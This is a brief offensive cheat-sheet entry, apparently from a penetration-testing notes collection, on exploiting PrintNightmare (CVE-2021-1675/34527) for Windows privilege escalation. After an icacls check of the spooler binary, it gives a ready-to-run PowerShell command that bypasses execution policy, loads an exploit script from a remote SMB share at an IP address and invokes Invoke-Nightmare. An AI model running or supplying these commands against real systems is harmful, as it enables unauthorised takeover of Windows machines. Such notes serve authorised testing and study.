---
title: PrintNightmare (CVE-2021-1675 / 34527)
category: privesc
subcategory: windows-misc
os: windows
command: powershell -ep bypass . \\share\CVE-2021-1675.ps1;Invoke-Nightmare
tools: powershell, icacls
---


### Verify spoolsv

```cmd
icacls.exe "C:\Windows\System32\spoolsv.exe"
```

### Run the PoC

```powershell
powershell -ep bypass . \\10.13.31.108\share\CVE-2021-1675.ps1;Invoke-Nightmare
```

### Reference

https://github.com/calebstewart/CVE-2021-1675
